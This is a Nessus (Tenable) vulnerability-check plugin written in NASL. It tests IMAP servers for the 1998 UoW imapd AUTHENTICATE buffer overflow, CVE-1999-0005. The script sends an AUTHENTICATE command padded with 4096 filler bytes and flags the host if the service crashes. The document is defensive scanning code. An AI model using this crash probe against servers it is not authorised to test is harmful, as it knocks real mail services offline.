#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10292);
 script_version ("$Revision: 1.30 $");
 script_cve_id("CVE-1999-0005");
 script_bugtraq_id(130);
 script_osvdb_id(911);
 
 script_name(english:"UoW imapd AUTHENTICATE Command Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote IMAP server." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote IMAP server by sending
a too long AUTHENTICATE command.
An attacker may be able to exploit this vulnerability to 
execute code on the remote host." );
 script_set_attribute(attribute:"solution", value:
"Contact your IMAP server vendor." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1998/07/17");
 script_cvs_date("$Date: 2011/03/11 21:52:40 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"checks for imap authenticate buffer overflow"); 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2011 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "imap_overflow.nasl");
 script_exclude_keys("imap/false_imap");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"imap", default:143, exit_on_fail: 1);
soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");
 
  buf = recv_line(socket:soc, length:1024);
  if (!strlen(buf))
    exit(0);

data = strcat('* AUTHENTICATE {4096}\r\n', crap(4096), '\r\n');
send(socket:soc, data:data);

  buf = recv_line(socket:soc, length:1024);
  close (soc);

if (service_is_dead(port: port) > 0)
  {
   security_hole(port);
   set_kb_item(name:"imap/overflow", value:TRUE);
   set_kb_item(name:"imap/"+port+"/overflow", value:TRUE);
  }
